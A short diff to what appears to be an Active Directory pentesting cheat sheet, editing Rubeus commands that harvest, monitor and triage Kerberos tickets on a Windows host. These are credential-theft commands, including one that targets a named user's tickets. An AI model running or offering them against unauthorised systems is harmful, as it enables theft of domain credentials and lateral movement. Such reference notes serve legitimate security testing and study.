@@ -497,7 +497,7 @@ Brute Password spray:
 
 #### List tickets
 Get tickets currently on System:
-- All - ```Rubeus.exe harvest /interval:30```
+- All - ```Rubeus.exe harvest /interval:30 /runfor:300 /nowrap```
 - Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
 
 - List all kerberos tickets from current logon sessions - ```Rubeus.exe triage```
